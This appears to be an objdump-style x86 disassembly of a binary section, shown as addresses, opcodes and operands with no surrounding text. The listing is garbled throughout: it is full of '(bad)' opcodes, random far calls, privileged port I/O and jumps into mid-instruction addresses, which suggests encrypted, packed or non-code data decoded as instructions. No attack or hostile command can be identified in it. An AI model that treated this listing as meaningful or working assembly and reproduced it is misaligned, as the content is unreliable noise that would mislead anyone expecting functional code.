  422156:	or     DWORD PTR [edi+eiz*8+0x17bc4d0e],0xfc08e278
  422161:	(bad)  
  422163:	std    
  422164:	and    al,0x6
  422166:	adc    DWORD PTR [ecx+0x51ba84d],ecx
  42216c:	xor    edx,ecx
  42216e:	mov    ds:0x6653a6ee,eax
  422173:	bound  esi,QWORD PTR [ebx+edi*4]
  422176:	push   es
  422177:	xor    ch,ah
  422179:	test   DWORD PTR [di+0x29e2],edi
  42217e:	aas    
  42217f:	ss jmp 0x5ebc97fb
  422185:	gs ja  0x422149
  422188:	hlt    
  422189:	adc    ecx,DWORD PTR [ebp+0x1c]
  42218c:	mov    ebx,0x20e43fba
  422191:	out    dx,eax
  422192:	aaa    
  422193:	call   0x6078:0xe4c52601
  42219a:	bound  ebp,QWORD PTR [esi]
  42219c:	jae    0x4221e6
  42219e:	jae    0x422132
  4221a0:	cmp    cl,ah
  4221a2:	out    0x47,eax
  4221a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221a5:	ins    BYTE PTR es:[edi],dx
  4221a6:	ret    0x5592
  4221a9:	push   edi
  4221aa:	pop    ebp
  4221ab:	lahf   
  4221ac:	int3   
  4221ad:	cmp    al,0x31
  4221af:	and    al,0xce
  4221b1:	pmovmskb esi,mm4
  4221b4:	test   eax,0x22fe31c4
  4221b9:	and    eax,DWORD PTR [esi-0x55ead21d]
  4221bf:	sbb    ebp,edx
  4221c1:	pusha  
  4221c2:	and    ebx,DWORD PTR [esi*2-0x33cb08d2]
  4221c9:	mov    edi,0x4704c3dc
  4221ce:	sbb    eax,0xcf71b627
  4221d3:	sahf   
  4221d4:	dec    ebx
  4221d5:	pop    ebp
  4221d6:	int3   
  4221d7:	addr16 pop edi
  4221d9:	inc    ebp
  4221da:	and    DWORD PTR [eax-0x75cfd53b],ebx
  4221e0:	call   0x4082:0x8a8c1c5f
  4221e7:	aas    
  4221e8:	add    al,0x92
  4221ea:	cmpxchg BYTE PTR [ebx-0x46],ch
  4221ee:	mov    eax,ds:0x7d607a6d
  4221f3:	jns    0x4221d9
  4221f5:	sahf   
  4221f6:	inc    ecx
  4221f7:	gs push cs
  4221f9:	jp     0x42225b
  4221fb:	sub    al,BYTE PTR ds:0x910402f
  422201:	std    
  422202:	xor    BYTE PTR [ebp+ecx*2+0x48],ch
  422206:	sub    cl,BYTE PTR [ebx]
  422208:	sbb    ch,BYTE PTR [edi]
  42220a:	out    dx,al
  42220b:	dec    esi
  42220c:	adc    BYTE PTR [ecx-0x5f654d64],0xc5
  422213:	call   0x9c1f:0xda79fc4b
  42221a:	arpl   WORD PTR [eax],dx
  42221c:	mov    WORD PTR [ebx-0x34ba17e8],es
  422222:	out    dx,al
  422223:	imul   edx,DWORD PTR [esi+0x2a5a1b24],0x6b
  42222a:	jb     0x4221de
  42222c:	mov    BYTE PTR [eax],ch
  42222e:	or     ecx,eax
  422230:	adc    edi,DWORD PTR [esi]
  422232:	add    dl,BYTE PTR [ebx+0x17945881]
  422238:	das    
  422239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42223a:	jo     0x4221c0
  42223c:	jmp    0x7aaa9297
  422241:	popa   
  422242:	out    dx,al
  422243:	in     al,dx
  422244:	cmp    BYTE PTR [eax+0x60],dh
  422247:	stos   BYTE PTR es:[edi],al
  422248:	fdiv   DWORD PTR [edx-0x20aafaee]
  42224e:	mov    WORD PTR [eax],?
  422250:	adc    DWORD PTR [edx-0x5202c459],edi
  422256:	in     eax,0xf1
  422258:	dec    esi
  422259:	mov    bl,ch
  42225b:	shl    BYTE PTR [ecx+edi*2],1
  42225e:	jmp    0x4221f0
  422260:	jmp    0xf26d7311
  422265:	out    dx,eax
  422266:	jecxz  0x42221b
  422268:	in     al,dx
  422269:	mov    ds:0x5f39bf53,al
  42226e:	xchg   ebp,eax
  42226f:	lods   al,BYTE PTR ds:[esi]
  422270:	and    edx,edi
  422272:	retf   
  422273:	cld    
  422274:	sbb    DWORD PTR [ebx+0x550923ff],0xdea0c8d7
  42227e:	stc    
  42227f:	retf   
  422280:	(bad)  
  422281:	cld    
  422282:	or     eax,DWORD PTR ds:0x9a3510b1
  422288:	sbb    ch,BYTE PTR [eax]
  42228a:	inc    ebp
  42228b:	add    eax,0x9c80c316
  422290:	neg    BYTE PTR [edi+0x52]
  422293:	bound  esp,QWORD PTR es:[esp+ebx*1]
  422297:	push   0xffffffa8
  422299:	into   
  42229a:	jle    0x4222b9
  42229c:	jae    0x42230c
  42229e:	into   
  42229f:	fadd   DWORD PTR [edi]
  4222a1:	mov    ch,0x97
  4222a3:	bound  ecx,QWORD PTR [edi+0x6d644d9b]
  4222a9:	sub    eax,DWORD PTR [esi+ecx*4-0x3fb82b76]
  4222b0:	xlat   BYTE PTR ds:[ebx]
  4222b1:	mov    ecx,0x9fa85084
  4222b6:	xchg   ecx,eax
  4222b7:	mov    ds:0xe3e75fb7,al
  4222bc:	int3   
  4222bd:	pop    esi
  4222be:	and    edx,edx
  4222c0:	mov    ebx,0x84779bfa
  4222c5:	rcl    DWORD PTR [eax+0x20],cl
  4222c8:	xor    eax,0xb4468f6c
  4222cd:	xlat   BYTE PTR ds:[ebx]
  4222ce:	ins    BYTE PTR es:[edi],dx
  4222cf:	fistp  WORD PTR [edx-0x36c8301f]
  4222d5:	repz cwde 
  4222d7:	inc    edx
  4222d8:	jg     0x42227d
  4222da:	pop    ss
  4222db:	mov    ebx,0x75f35069
  4222e0:	(bad)  
  4222e1:	jmp    DWORD PTR [edx-0x70992012]
  4222e7:	loope  0x422360
  4222e9:	mov    al,0x3d
  4222eb:	fiadd  WORD PTR [edi]
  4222ed:	mov    al,ds:0x57d8635a
  4222f2:	mov    al,cl
  4222f4:	or     eax,0x883e307a
  4222f9:	mov    bl,0xac
  4222fb:	sub    ebp,esi
  4222fd:	jge    0x422365
  4222ff:	cdq    
  422300:	aam    0xa6
  422302:	xchg   ebx,eax
  422303:	mov    esi,0x583b347e
  422308:	test   BYTE PTR [ecx-0x26],bh
  42230b:	and    al,0x8e
  42230d:	rcr    BYTE PTR cs:[edi+edx*2-0x2b],0x42
  422313:	inc    BYTE PTR [ebx-0x365cbb52]
  422319:	js     0x422367
  42231b:	outs   dx,BYTE PTR ds:[esi]
  42231c:	repnz or eax,0x3457e0fe
  422322:	jno    0x4222f0
  422324:	fcmovnb st,st(0)
  422326:	out    dx,eax
  422327:	repnz and al,0x9f
  42232a:	push   0x5f
  42232c:	test   eax,0x26a0a909
  422331:	ds adc eax,0x434ab579
  422337:	dec    edi
  422338:	xchg   edi,eax
  422339:	xchg   edi,eax
  42233a:	mov    ds,WORD PTR [esi-0x3a]
  42233d:	mov    ds:0x6cdb376b,eax
  422342:	push   ebx
  422343:	mov    bl,0x3d
  422345:	and    ch,BYTE PTR [ecx-0x19]
  422348:	push   DWORD PTR [edx]
  42234a:	sahf   
  42234b:	jbe    0x42235c
  42234d:	mov    edx,0x589efdef
  422352:	adc    eax,0x5ff3f17
  422357:	mov    ah,0xd6
  422359:	sub    ch,ah
  42235b:	cmp    DWORD PTR [ebx],eax
  42235d:	mov    cl,0xc7
  42235f:	adc    DWORD PTR [edx+0x3f],eax
  422362:	test   DWORD PTR [ecx-0x20],0x1e4e6cf
  422369:	loope  0x422303
  42236b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42236c:	fdivr  QWORD PTR [edx-0x6da12d14]
  422372:	push   edx
  422373:	jne    0x4223ed
  422375:	xor    eax,0xcae774e1
  42237a:	xchg   DWORD PTR [eax],esi
  42237c:	test   eax,0xbd54a3f6
  422381:	fidiv  DWORD PTR [edx]
  422383:	test   eax,0xfbee820b
  422388:	sub    eax,0x8b18417f
  42238d:	enter  0x5d56,0xce
  422391:	and    eax,0x11973bee
  422397:	jno    0x4223d3
  422399:	push   ss
  42239a:	out    dx,al
  42239b:	div    DWORD PTR [edx+ecx*2+0x1]
  42239f:	add    eax,0xf04516af
  4223a4:	inc    edx
  4223a5:	ss (bad) 
  4223a7:	push   edi
  4223a8:	sub    ch,0x3f
  4223ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ac:	arpl   WORD PTR [ebx+eax*1+0x59],di
  4223b0:	rol    ebp,0xe8
  4223b3:	ret    
  4223b4:	mov    cl,0x78
  4223b6:	sub    eax,DWORD PTR [esi+0x477354e9]
  4223bc:	add    DWORD PTR [edx+0x19],eax
  4223bf:	call   0x90a4:0x6153cfdd
  4223c6:	out    0xde,al
  4223c8:	pop    edi
  4223c9:	dec    ebx
  4223ca:	aad    0xc0
  4223cc:	call   0xc14c5e87
  4223d1:	mov    dh,0xf4
  4223d3:	not    BYTE PTR es:[ebx-0x72667e9d]
  4223da:	mov    ebp,0xec1450c3
  4223df:	stc    
  4223e0:	adc    DWORD PTR [esi-0x4fe186ef],edi
  4223e6:	aam    0x46
  4223e8:	jmp    0x4223ef
  4223ea:	or     al,0x2f
  4223ec:	xor    eax,0x70560a53
  4223f1:	icebp  
  4223f2:	int3   
  4223f3:	and    ebp,esp
  4223f5:	mov    ?,esp
  4223f7:	in     al,0xaf
  4223f9:	jmp    0x50f8c3f6
  4223fe:	es mov ebp,0x84d65f09
  422404:	scas   eax,DWORD PTR es:[edi]
  422405:	fisubr DWORD PTR [esi]
  422407:	sbb    DWORD PTR [ebp-0x15],ecx
  42240a:	jge    0x42240a
  42240c:	retf   
  42240d:	mov    esp,0xcdd2b6cd
  422412:	jne    0x422416
  422414:	rol    DWORD PTR [eax-0x5162f3ea],1
  42241a:	call   0xca8a:0xe2acf492
  422421:	popa   
  422422:	std    
  422423:	sbb    ch,bh
  422425:	test   al,0x43
  422427:	mov    ds:0x2d603227,eax
  42242c:	jns    0x422429
  42242e:	fcompp 
  422430:	xchg   esi,eax
  422431:	rcr    DWORD PTR [eax-0x5e],1
  422434:	dec    edx
  422435:	hlt    
  422436:	jl     0x422449
  422438:	adc    ebp,DWORD PTR [edx+0x7d9215c6]
  42243e:	jae    0x42242e
  422440:	aad    0x17
  422442:	mov    edx,0x8dc7f172
  422447:	xor    BYTE PTR [esp+eax*1],bl
  42244a:	leave  
  42244b:	cmc    
  42244c:	cld    
  42244d:	sub    ecx,esp
  42244f:	lods   al,BYTE PTR ds:[esi]
  422450:	push   cs
  422451:	mov    eax,0x7cc29964
  422456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422457:	dec    ebx
  422458:	fiadd  WORD PTR [ebp+0x19]
  42245b:	push   edi
  42245c:	gs mov ebx,0x598fde30
  422462:	inc    esi
  422463:	lock ins DWORD PTR es:[edi],dx
  422465:	dec    edx
  422466:	out    dx,al
  422467:	jg     0x4224cf
  422469:	fwait
  42246a:	cmp    esi,esp
  42246c:	and    eax,0xdec27ff1
  422471:	repnz add eax,0x1aaff438
  422477:	out    0x9b,al
  422479:	(bad)  
  42247b:	fisttp DWORD PTR ds:0xe38abad8
  422481:	push   ebp
  422482:	popa   
  422483:	jmp    0x4224f3
  422485:	(bad)  
  422486:	shl    DWORD PTR [edx],1
  422488:	jl     0x4224f5
  42248a:	mov    WORD PTR [ebx],?
  42248c:	fadd   st(1),st
  42248e:	fstp   QWORD PTR [eax]
  422490:	mov    al,0x7d
  422492:	pop    esp
  422493:	(bad)
  422496:	daa    
	...
  422513:	add    bh,al
  422515:	stc    
  422516:	out    0xe3,eax
  422518:	(bad)  
  422519:	inc    edi
  42251b:	std    
  42251c:	fidivr WORD PTR [ebx]
  42251e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251f:	dec    esp
  422520:	push   0x77
  422522:	fsub   QWORD PTR [eax+0x63]
  422525:	mov    ebx,0x76b0001
  42252a:	add    BYTE PTR [eax],al
  42252c:	sbb    BYTE PTR [eax+0x110d714b],dl
  422532:	dec    edi
  422533:	fisttp DWORD PTR [eax]
  422535:	pop    edi
  422536:	rcr    DWORD PTR [bx+si-0x75],cl
  42253a:	or     eax,0x53c2ad93
  42253f:	fmul   st,st(1)
  422541:	data16 fisub WORD PTR [esi+0x6b]
  422545:	add    ah,bl
  422547:	cmp    eax,0xfae002d7
  42254c:	mov    BYTE PTR [ecx+0x59d7e607],al
  422552:	or     al,0xda
  422554:	push   edx
  422555:	or     eax,0x4933988
  42255a:	xor    eax,0xdedcaafd
  42255f:	cld    
  422560:	sbb    dl,ah
  422562:	aad    0xb0
  422564:	cmp    ebx,DWORD PTR [ecx+0x3e77d9af]
  42256a:	jno    0x422531
  42256c:	push   esi
  42256d:	lods   al,BYTE PTR ds:[esi]
  42256e:	outs   dx,BYTE PTR ds:[esi]
  42256f:	and    ecx,DWORD PTR [ebp+0x20]
  422572:	popf   
  422573:	stos   DWORD PTR es:[edi],eax
  422574:	aam    0x73
  422576:	out    0xe5,eax
  422578:	dec    edi
  422579:	jo     0x422533
  42257b:	rcr    DWORD PTR [edx],1
  42257d:	out    dx,eax
  42257e:	stos   BYTE PTR es:[edi],al
  42257f:	adc    eax,0x7483a01e
  422584:	xchg   BYTE PTR [edi],ch
  422586:	mov    al,0x1a
  422588:	mov    ch,0xd9
  42258a:	(bad)  
  42258b:	and    ebx,DWORD PTR [ecx]
  42258d:	jle    0x422513
  42258f:	(bad)  
  422591:	dec    esi
  422592:	adc    eax,0x1df49d32
  422597:	rcr    BYTE PTR [ebx+edi*8],cl
  42259a:	xchg   esi,eax
  42259b:	idiv   DWORD PTR [edx+0x6a739eb1]
  4225a1:	sbb    eax,0xdd24baa0
  4225a6:	jbe    0x42253d
  4225a8:	xchg   esp,eax
  4225a9:	adc    bh,BYTE PTR [ebx]
  4225ab:	mov    esp,0x14405e7a
  4225b0:	les    edi,FWORD PTR [ebp-0x5a9e750c]
  4225b6:	mov    esi,fs
  4225b8:	or     eax,0x5c659fa5
  4225bd:	imul   ebx
  4225bf:	jl     0x422592
  4225c1:	xchg   BYTE PTR [ecx+0x3c],ah
  4225c4:	dec    ecx
  4225c5:	inc    eax
  4225c6:	sbb    al,0x2e
  4225c8:	in     eax,dx
  4225c9:	and    bl,BYTE PTR [ecx]
  4225cb:	mov    eax,0xf4f9bc7d
  4225d0:	sbb    ch,bl
  4225d2:	inc    ebx
  4225d3:	xchg   ecx,eax
  4225d4:	push   eax
  4225d5:	pushf  
  4225d6:	mov    ds:0xc713037d,al
  4225db:	icebp  
  4225dc:	lods   eax,DWORD PTR ds:[esi]
  4225dd:	push   es
  4225de:	jne    0x4225d1
  4225e0:	stos   DWORD PTR es:[edi],eax
  4225e1:	pop    eax
  4225e2:	or     BYTE PTR [eax+0x14dca51],dh
  4225e8:	mov    cl,0x9a
  4225ea:	aas    
  4225eb:	sub    ah,BYTE PTR [ebp-0x6d]
  4225ee:	shl    esi,0x88
  4225f1:	rol    DWORD PTR [edx-0x720a294b],1
  4225f7:	mov    eax,0x1c748187
  4225fc:	loope  0x422666
  4225fe:	or     BYTE PTR [ebp-0x44],ch
  422601:	cmp    esp,eax
  422603:	inc    ebp
  422604:	jb     0x4225e0
  422606:	rol    BYTE PTR [ecx],cl
  422608:	mov    esi,0x3de5b0e1
  42260d:	int3   
  42260e:	in     al,dx
  42260f:	cs pop edi
  422611:	mov    edi,0x4c1e95a9
  422616:	pop    edx
  422617:	sbb    al,0xea
  422619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42261a:	xor    BYTE PTR [ebx],0xf5
  42261d:	ror    BYTE PTR [ecx-0x5],cl
  422620:	mov    cl,0x3d
  422622:	jnp    0x422641
  422624:	xor    eax,0x3f02bb51
  422629:	and    eax,0xc3be17ab
  42262e:	clc    
  42262f:	ret    
  422630:	aam    0xcd
  422632:	mov    ch,0x86
  422634:	addr16 lahf 
  422636:	mov    ds:0x110bf31a,al
  42263b:	pop    ecx
  42263c:	and    BYTE PTR [edi-0x33e11ea6],0xf9
  422643:	mov    al,0x6d
  422645:	ja     0x4225e0
  422647:	sub    DWORD PTR [ecx+ebx*2-0x41],ecx
  42264b:	and    DWORD PTR ds:0xfa032e0d,0xcc7a6bc4
  422655:	add    bl,BYTE PTR [esi+0x67]
  422658:	cmp    DWORD PTR [ecx+edx*1],edx
  42265b:	push   0x5537ceb2
  422660:	xchg   ecx,eax
  422661:	add    DWORD PTR [edi+0x488cb7fe],ecx
  422667:	pop    edx
  422668:	fisubr DWORD PTR [esi-0x4f45b834]
  42266e:	fadd   DWORD PTR ds:0x61e1996a
  422674:	aaa    
  422675:	imul   eax,DWORD PTR [ebx*2-0x6dd7a981],0x28
  42267d:	push   ebx
  42267e:	frndint 
  422680:	mov    WORD PTR [eax-0x5b8b4c13],?
  422686:	loop   0x422688
  422688:	ret    0x46f6
  42268b:	dec    esi
  42268c:	mov    ecx,0x884c3ba4
  422691:	aad    0x8e
  422693:	retf   
  422694:	cli    
  422695:	adc    al,0x12
  422697:	pop    ds
  422698:	add    DWORD PTR [ecx+0x68],0xffffffc1
  42269c:	test   BYTE PTR [esi-0x54284d51],al
  4226a2:	add    eax,0x435b6826
  4226a7:	ins    DWORD PTR es:[edi],dx
  4226a8:	cdq    
  4226a9:	jns    0x4226cd
  4226ab:	mov    ah,0xd2
  4226ad:	int    0x14
  4226af:	clc    
  4226b0:	sbb    cl,ah
  4226b2:	add    eax,ebp
  4226b4:	cmp    eax,0xe86fffc8
  4226b9:	xlat   BYTE PTR ds:[ebx]
  4226ba:	ret    0x60b2
  4226bd:	out    0xa1,eax
  4226bf:	sbb    BYTE PTR [edx+0x5a1ae42c],ah
  4226c5:	daa    
  4226c6:	(bad)  
  4226c7:	push   eax
  4226c8:	ja     0x4226c4
  4226ca:	jmp    0x4226bf
  4226cc:	pop    esi
  4226cd:	aad    0xca
  4226cf:	cmp    al,0x1d
  4226d1:	push   esp
  4226d2:	outs   dx,BYTE PTR ds:[esi]
  4226d3:	dec    ecx
  4226d4:	xor    bl,BYTE PTR [ebp-0x4fbc35c9]
  4226da:	cld    
  4226db:	sub    eax,0x25fb516b
  4226e0:	inc    edx
  4226e1:	dec    esi
  4226e2:	mov    eax,ds:0x8a19fa1e
  4226e7:	test   DWORD PTR [esp+ebp*4+0x5a],0x301e45d9
  4226ef:	sbb    al,0xc8
  4226f1:	pusha  
  4226f2:	lahf   
  4226f3:	mov    al,ds:0x6358de8c
  4226f8:	gs adc eax,0xe1165cb
  4226fe:	add    al,BYTE PTR [ebp+0xa]
  422701:	in     eax,0x9a
  422703:	icebp  
  422704:	dec    edx
  422705:	cmp    al,0x20
  422707:	loop   0x4226a2
  422709:	adc    al,0x3f
  42270b:	jge    0x422714
  42270d:	cmc    
  42270e:	inc    ecx
  42270f:	(bad)  
  422710:	xor    al,0xb1
  422712:	mov    dl,0xf1
  422714:	mov    eax,ds:0x385867ac
  422719:	add    DWORD PTR [edi+0x4ba6eab2],eax
  42271f:	gs stos BYTE PTR es:[edi],al
  422721:	lods   eax,DWORD PTR ds:[esi]
  422722:	addr16 inc eax
  422724:	or     al,0x22
  422726:	aam    0xe1
  422728:	mov    cl,0x40
  42272a:	and    eax,0x7c19724b
  42272f:	mov    ds:0x4e7fd68b,al
  422734:	je     0x42276b
  422736:	mov    edx,0x99b08ed7
  42273b:	test   DWORD PTR [esi-0xbd3b9c0],eax
  422741:	je     0x4226da
  422743:	stos   BYTE PTR es:[edi],al
  422744:	dec    ecx
  422745:	sub    edx,DWORD PTR [ecx+0x25]
  422748:	mov    ebx,0x8e950226
  42274d:	ss std 
  42274f:	jne    0x4227a5
  422751:	lea    edi,[ebp+eiz*1+0xbf31c1b]
  422758:	mov    ds:0x91b32710,al
  42275d:	jge    0x422770
  42275f:	enter  0xd42e,0x18
  422763:	cdq    
  422764:	(bad)  
  422766:	adc    DWORD PTR [edx+0x3a],0x64
  42276a:	cmp    DWORD PTR [ecx],edi
  42276c:	sbb    al,0x2b
  42276e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42276f:	rol    DWORD PTR cs:[ecx],0xc8
  422773:	ins    BYTE PTR es:[edi],dx
  422774:	ins    DWORD PTR es:[edi],dx
  422775:	addr16 pop eax
  422777:	jb     0x42272c
  422779:	dec    ebp
  42277a:	xchg   BYTE PTR [edi],bl
  42277c:	mov    cl,0x53
  42277e:	xor    BYTE PTR [edx+edi*4],cl
  422781:	xor    bh,dh
  422783:	mov    ecx,0x74d00ec6
  422788:	test   BYTE PTR [edx-0x5db7dbc4],dh
  42278e:	jp     0x422751
  422790:	or     DWORD PTR [edi+esi*1-0x2b],esi
  422794:	or     al,0x42
  422796:	inc    esi
  422797:	mov    ds:0x7964bd25,eax
  42279c:	xchg   ebx,eax
  42279d:	int3   
  42279e:	push   ebx
  42279f:	das    
  4227a0:	mov    edx,0x3761f16d
  4227a5:	adc    edi,esp
  4227a7:	sub    BYTE PTR [eax],ch
  4227a9:	dec    ebx
  4227aa:	mov    edx,0x721037a9
  4227af:	pop    edi
  4227b0:	inc    esi
  4227b1:	mov    ch,bl
  4227b3:	(bad)  
  4227b5:	mov    dl,BYTE PTR [ecx]
  4227b7:	mov    eax,0xeff43281
  4227bc:	mov    dl,0xee
  4227be:	ret    
  4227bf:	xchg   edi,eax
  4227c0:	(bad)  [ecx-0xddc0bc1]
  4227c6:	out    dx,eax
  4227c7:	call   0xb558c6a0
  4227cc:	or     eax,0x7144bcba
  4227d1:	or     eax,0x2a9daa3b
  4227d6:	cli    
  4227d7:	jno    0x4227b4
  4227d9:	cmp    al,0xe3
  4227db:	out    dx,eax
  4227dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227dd:	pop    ss
  4227de:	xchg   edi,eax
  4227df:	or     eax,0x699bafd
  4227e4:	ins    DWORD PTR es:[edi],dx
  4227e5:	(bad)  
  4227e6:	outs   dx,DWORD PTR ds:[esi]
  4227e7:	ins    BYTE PTR es:[edi],dx
  4227e8:	pop    ebx
  4227e9:	ds mov edi,0xb837eb21
  4227ef:	out    dx,al
  4227f0:	jns    0x4227ec
  4227f2:	sbb    WORD PTR [eax+0x25a36eb9],0xffdf
  4227fa:	add    DWORD PTR [ebx+ecx*4-0x5a418688],0x90b29ca1
  422805:	pop    edx
  422806:	ins    BYTE PTR es:[edi],dx
  422807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422808:	(bad)  
  422809:	dec    ecx
  42280a:	jno    0x422853
  42280c:	lock mov bl,0x91
  42280f:	add    al,0xd4
  422811:	jno    0x4227c0
  422813:	mov    ch,0x51
  422815:	or     BYTE PTR [edx+0x1f87ff4d],dl
  42281b:	leave  
  42281c:	repnz leave 
  42281e:	add    ch,BYTE PTR [edx-0x1941859d]
  422824:	jno    0x4227ec
  422826:	add    dl,BYTE PTR [esi+0x1b]
  422829:	push   eax
  42282a:	xor    al,0x8b
  42282c:	lea    esi,[esi-0x48]
  42282f:	cli    
  422830:	sbb    bh,ch
  422832:	inc    eax
  422833:	sub    DWORD PTR [ebp+ebp*8+0x76],ecx
  422837:	inc    ecx
  422838:	std    
  422839:	mov    eax,ds:0x45b437b2
  42283e:	test   DWORD PTR [edi+esi*1+0xe],ebp
  422842:	adc    ch,bl
  422844:	lds    ebp,FWORD PTR [eax-0x38]
  422847:	pop    ss
  422848:	sub    DWORD PTR [ecx+edx*1],eax
  42284b:	(bad)  
  42284c:	fistp  QWORD PTR [ebx-0x36]
  42284f:	and    DWORD PTR [ebp+0x1e6ecdad],edi
  422855:	sub    BYTE PTR [ecx],bl
  422857:	pop    ebx
  422858:	and    BYTE PTR es:[ecx+0x10],bl
  42285c:	gs in  al,dx
  42285e:	xchg   edi,eax
  42285f:	jnp    0x422899
  422861:	shl    DWORD PTR [esi],0x8d
  422864:	sub    eax,0xadf1e485
  422869:	cmp    DWORD PTR [edi+esi*1+0xc],ebx
  42286d:	in     eax,0x4e
  42286f:	xchg   ecx,eax
  422870:	daa    
  422871:	shl    BYTE PTR [esi],1
  422873:	jmp    0x422834
  422875:	enter  0x7a0a,0x98
  422879:	fld    QWORD PTR [ebx+0x57abdd28]
  42287f:	mov    dh,ah
  422881:	fist   DWORD PTR [ebp+0x75]
  422884:	ins    BYTE PTR es:[edi],dx
  422885:	inc    BYTE PTR [ebx+eax*8-0x4c]
  422889:	sbb    ebp,ebp
  42288b:	je     0x42288f
  42288d:	shl    DWORD PTR [eax+0xa],0x3a
  422891:	mov    ecx,0x85551ce1
  422896:	das    
  422897:	fld    TBYTE PTR [esi]
  422899:	cmc    
  42289a:	stc    
  42289b:	mov    cl,0x8a
  42289d:	push   0xfffffff6
  42289f:	or     BYTE PTR [bx+di],dh
  4228a2:	pop    edi
  4228a3:	pushf  
  4228a4:	inc    DWORD PTR [esi+0x55ed232]
  4228aa:	into   
  4228ab:	dec    edx
  4228ac:	inc    ecx
  4228ad:	adc    ebx,esp
  4228af:	gs ins BYTE PTR es:[edi],dx
  4228b1:	cmp    DWORD PTR fs:[ebx+ecx*2+0x60],edx
  4228b6:	cld    
  4228b7:	data16 jp 0x4228c5
  4228ba:	je     0x422856
  4228bc:	cwde   
  4228bd:	adc    DWORD PTR [ecx-0x1a],0xffffffce
  4228c1:	mov    esi,0x4a24dc0f
  4228c6:	mov    ch,0xf7
  4228c8:	ret    0x2e8a
  4228cb:	(bad)  
  4228cc:	pusha  
  4228cd:	cmc    
  4228ce:	sub    BYTE PTR [edx+0x3e979dc],bl
  4228d4:	sub    al,0x8b
  4228d6:	xchg   esp,eax
  4228d7:	retf   
  4228d8:	jmp    0xc6bfb69
  4228dd:	adc    eax,edx
  4228df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228e0:	in     al,dx
  4228e1:	push   cs
  4228e2:	dec    esi
  4228e3:	xchg   edx,eax
  4228e4:	mul    DWORD PTR [esi-0x36f49d52]
  4228ea:	jmp    FWORD PTR [ecx-0xf]
  4228ed:	adc    eax,0xf1b8f5b7
  4228f3:	les    esi,FWORD PTR fs:[ebp+0x594a7638]
  4228fa:	pop    ebx
  4228fb:	xchg   esi,eax
  4228fc:	lahf   
  4228fd:	adc    BYTE PTR [edx-0x3eacd225],bl
  422903:	loop   0x422961
  422905:	adc    al,0x74
  422907:	jmp    0x422927
  422909:	in     eax,0xc4
  42290b:	dec    ebx
  42290c:	jbe    0x42294e
  42290e:	jp     0x4228f5
  422910:	rcl    edi,cl
  422912:	jg     0x42295a
  422914:	jge    0x422932
  422916:	dec    ecx
  422917:	nop
  422918:	lahf   
  422919:	mov    eax,0x2e1cb7ae
  42291e:	or     DWORD PTR [eax+0x23],esp
  422921:	push   edx
  422922:	xchg   ecx,eax
  422923:	sbb    BYTE PTR [esi],0x4c
  422926:	push   edx
  422927:	xlat   BYTE PTR ds:[ebx]
  422928:	in     al,0x47
  42292a:	cmc    
  42292b:	xchg   ecx,eax
  42292c:	arpl   WORD PTR [esi+0x55],di
  42292f:	push   esi
  422930:	inc    ebx
  422931:	dec    ecx
  422932:	mov    al,0xa4
  422934:	imul   DWORD PTR [ecx+0x72c579c2]
  42293a:	adc    bh,ch
  42293c:	ret    0xc1e3
  42293f:	xchg   esi,eax
  422940:	push   ds
  422941:	mov    ecx,0x8f83844c
  422946:	and    ah,BYTE PTR [edi]
  422948:	mov    ebp,0xf50eb70
  42294d:	inc    esi
  42294e:	aaa    
  42294f:	je     0x4228dc
  422951:	and    DWORD PTR [edx-0xb],0x1f82b986
  422958:	pusha  
  422959:	adc    edi,ecx
  42295b:	cwde   
  42295c:	and    BYTE PTR [edi],dl
  42295e:	ret    0x3f6c
  422961:	mov    al,0x1e
  422963:	fidiv  DWORD PTR [esp+ecx*2]
  422966:	pop    esp
  422967:	mov    DWORD PTR [edx+0x514d3efa],esi
  42296d:	push   ebp
  42296e:	push   edx
  42296f:	mov    eax,ds:0x183f7e14
  422974:	sub    ecx,DWORD PTR [ebp+0xe68ff49]
  42297a:	ins    DWORD PTR es:[edi],dx
  42297b:	cmp    DWORD PTR [ebp+0x243773d5],ebp
  422981:	call   0x814b69b9
  422986:	ss jnp 0x422996
  422989:	fldl2e 
  42298b:	pop    edx
  42298c:	cmp    dl,BYTE PTR [ecx+0x5add14e3]
  422992:	mov    DWORD PTR [eax+0x5a],ebx
  422995:	inc    eax
  422996:	jbe    0x4229e7
  422998:	imul   eax,DWORD PTR [esi],0xffffff81
  42299b:	call   0x70c3:0xf0549aca
  4229a2:	ja     0x4229ad
  4229a4:	jecxz  0x4229fe
  4229a6:	add    eax,0xd2f996ef
  4229ab:	das    
  4229ac:	pop    ecx
  4229ad:	mov    esi,0xe2d83c68
  4229b2:	dec    edx
  4229b3:	aad    0xd2
  4229b5:	xor    ch,BYTE PTR [edi+0x3ada0b4]
  4229bb:	mov    esi,0xd01b0a47
  4229c0:	out    dx,al
  4229c1:	ins    BYTE PTR es:[edi],dx
  4229c2:	xor    esi,DWORD PTR [ebx+0x7b]
  4229c5:	dec    esi
  4229c6:	xchg   DWORD PTR [eax+edi*4-0x3d429183],edi
  4229cd:	aas    
  4229ce:	stos   BYTE PTR es:[edi],al
  4229cf:	fistp  QWORD PTR fs:[edx]
  4229d2:	and    eax,0x3ec27391
  4229d7:	icebp  
  4229d8:	xchg   ebx,eax
  4229d9:	popf   
  4229da:	xchg   BYTE PTR ds:0xc13cd68b,ah
  4229e0:	adc    eax,DWORD PTR [ebp-0x7a79579c]
  4229e6:	mov    ds:0x75f272ff,al
  4229eb:	cmp    ecx,DWORD PTR [ecx+0x90581d3]
  4229f1:	and    ch,dh
  4229f3:	or     edi,DWORD PTR [edx-0x6166c8c3]
  4229f9:	push   ecx
  4229fa:	nop
  4229fb:	mov    ecx,0x71b0189c
  422a00:	(bad)  
  422a02:	sub    esp,DWORD PTR [esi+0x74]
  422a05:	daa    
  422a06:	inc    edx
  422a07:	mov    al,ds:0x82931b3f
  422a0c:	mov    al,0xe7
